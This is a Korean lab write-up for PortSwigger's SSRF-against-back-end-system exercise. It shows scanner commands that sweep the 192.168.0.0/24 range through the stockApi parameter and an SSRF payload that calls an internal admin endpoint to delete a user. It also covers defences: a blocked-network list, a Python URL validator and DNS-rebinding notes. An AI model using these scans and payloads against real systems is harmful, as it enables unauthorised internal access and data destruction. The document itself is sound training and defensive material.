# Lab: Basic SSRF against another back-end system

## 개요

- **난이도**: Apprentice
- **주제**: SSRF — 사설 IP 대역 스캔 / 내부 백엔드 시스템 접근 / 인증 우회
- **링크**: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system

## 목표

`stockApi` 파라미터의 SSRF 로 `192.168.0.0/24` 대역을 스캔해 관리자 패널이 있는 내부 백엔드 서버를 찾고, carlos 를 삭제한다.

## 001 랩과의 차이

```
[001 랩 — localhost SSRF]
  대상: http://localhost/admin
  원리: 서버 자신(loopback) 을 신뢰
  탐색: 고정 주소 → 단일 요청으로 바로 접근

[002 랩 (이번) — 백엔드 시스템 SSRF]
  대상: http://192.168.0.X:8080/admin
  원리: 사설 IP 대역 내 다른 서버를 신뢰
  탐색: IP 스캔 필요 (어느 주소인지 모름)
  → 도구로 1~255 를 순회하며 응답 확인
```

## 사설 IP 대역과 SSRF

### 사설 IP 대역 (RFC 1918)

```
외부 인터넷에서 라우팅되지 않는 내부 전용 대역:

  10.0.0.0    /8   →  10.0.0.1   ~ 10.255.255.254
  172.16.0.0  /12  →  172.16.0.1 ~ 172.31.255.254
  192.168.0.0 /16  →  192.168.0.1 ~ 192.168.255.254

특성:
  외부 공격자가 직접 접근 불가 (인터넷 라우팅 없음)
  → 내부 방화벽이나 NAT 뒤에 존재
  → SSRF 로 서버가 대신 요청 → 내부 접근 가능
```

### loopback vs 사설 IP 비교

```
[loopback — 001 랩]
  127.0.0.1 / localhost
  서버 자기 자신에게 요청
  → 같은 프로세스/OS 내부 서비스

[사설 IP — 002 랩 (이번)]
  192.168.0.X / 10.X.X.X / 172.16.X.X
  같은 내부 네트워크의 다른 서버에 요청
  → 외부에서 접근 불가한 백엔드 서버
  → 관리 패널, DB, 캐시, 내부 API 등

공통점:
  외부에서 직접 접근 불가
  서버가 "내부" 라는 이유로 인증 없이 신뢰
  SSRF 로 해당 서버를 통해 우회 가능
```

## 공격 방법

### 도구를 이용한 IP 스캔

```bash
python3 tools/08-ssrf-internal-scan.py \
  --target "https://LAB-ID.web-security-academy.net/product/stock" \
  --param stockApi \
  --prefix 192.168.0 \
  --port 8080
```

```
출력 예시:
  192.168.0.1:8080   → HTTP 500
  192.168.0.2:8080   → HTTP 500
  ...
  [FOUND] 192.168.0.42:8080  →  HTTP 200
  ────────────────────────────────────────
  <관리자 패널 HTML — 삭제 경로 확인>
  ────────────────────────────────────────
  ...
  192.168.0.43:8080  → HTTP 500
```

### carlos 삭제

```bash
python3 tools/08-ssrf-internal-scan.py \
  --target "https://LAB-ID.web-security-academy.net/product/stock" \
  --param stockApi \
  --port 8080 \
  --admin-ip 192.168.0.42 \
  --delete carlos
```

### 실행 흐름

```
공격자 브라우저
  ↓ POST /product/stock
    stockApi=http://192.168.0.42:8080/admin/delete?username=carlos

취약한 프론트엔드 서버
  ↓ GET http://192.168.0.42:8080/admin/delete?username=carlos
    (내부 네트워크 요청 → 방화벽 우회)

내부 백엔드 서버 (192.168.0.42)
  인증 없이 허용 (내부 IP 신뢰)
  → carlos 삭제 처리
  → 200 응답

프론트엔드 서버
  ↓ 백엔드 응답을 공격자에게 반환
```

## 방어 — 사설 IP 대역 차단

### SSRF 방어에서 차단해야 할 주소 범위

```
[loopback]
  127.0.0.0/8
  ::1 (IPv6)

[사설 IP 대역 — RFC 1918]
  10.0.0.0/8
  172.16.0.0/12
  192.168.0.0/16

[링크-로컬 — 클라우드 메타데이터]
  169.254.0.0/16   → AWS/Azure/Oracle IMDS
  fd00::/8         → IPv6 ULA

[기타 특수 대역]
  0.0.0.0/8        → 일부 OS 에서 loopback 동작
  100.64.0.0/10    → Shared address (ISP 내부)

→ URL 파라미터에서 이 대역들로의 요청 모두 차단
```

### URL 검증 구현 예시

```python
import ipaddress
import socket
from urllib.parse import urlparse

BLOCKED_NETWORKS = [
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("0.0.0.0/8"),
]

def is_safe_url(url: str) -> bool:
    parsed = urlparse(url)
    hostname = parsed.hostname
    if not hostname:
        return False

    # localhost 명시 차단
    if hostname.lower() in ("localhost", "127.0.0.1", "::1"):
        return False

    # DNS 조회 후 실제 IP 검사 (DNS 리바인딩 대비)
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(hostname))
    except (socket.gaierror, ValueError):
        return False

    for network in BLOCKED_NETWORKS:
        if ip in network:
            return False

    return True
```

### DNS 리바인딩 주의

```
단순 도메인명 검사의 한계:
  evil.com → 처음엔 공개 IP 반환 (검사 통과)
           → 잠시 후 192.168.0.1 로 변경
  → 검사 시점과 요청 시점의 IP 가 다름

대응:
  1. DNS 조회 결과 IP 를 검사 (도메인명 아닌 IP 레벨 검사)
  2. 요청 직전 재검증 (검사 → 요청 사이 시간 최소화)
  3. HTTP 클라이언트 레벨에서 연결 IP 를 제한
     (소켓 연결 시 바인딩된 IP 재확인)
```

## 핵심 정리

- SSRF 방어에서 loopback(`127.0.0.1`) 만 차단하는 것은 불충분하다. 같은 내부 네트워크의 **사설 IP 대역 전체**를 차단해야 한다.
- 백엔드 서버가 내부 IP 발신 요청을 인증 없이 신뢰하는 설계가 근본 원인이다 — **네트워크 위치가 아닌 자격증명으로 인증**해야 한다.
- IP 스캔이 필요한 경우 스크립트로 자동화할 수 있다 (`tools/08-ssrf-internal-scan.py`).

## 배운 점 및 추가 학습

### 1. 내부 네트워크 서비스 신뢰 문제

```
잘못된 설계 가정:
  "사설 IP 에서 온 요청 = 내부 시스템 = 신뢰"
  → 방화벽이 외부를 막으니 인증 생략

문제:
  SSRF 로 프론트엔드를 통해 내부로 요청 가능
  → 방화벽 우회
  → 인증 없는 내부 서비스에 직접 접근

올바른 설계:
  모든 서비스 요청에 인증 토큰 요구
  내부 서비스도 상호 TLS (mTLS) 적용
  Zero Trust 아키텍처: "네트워크 위치를 신뢰하지 않음"
```

### 2. 001~002 랩 SSRF 비교

| 항목 | 001 (localhost) | 002 (백엔드 시스템) |
|------|----------------|-------------------|
| 대상 주소 | 127.0.0.1 / localhost | 192.168.0.X |
| 포트 | 80 (기본) | 8080 |
| 주소 탐색 | 불필요 (고정) | IP 스캔 필요 |
| 신뢰 원인 | loopback 신뢰 | 사설 IP 신뢰 |
| 방어 포인트 | loopback 차단 | 사설 IP 대역 전체 차단 |
| 도구 | 불필요 | `08-ssrf-internal-scan.py` |
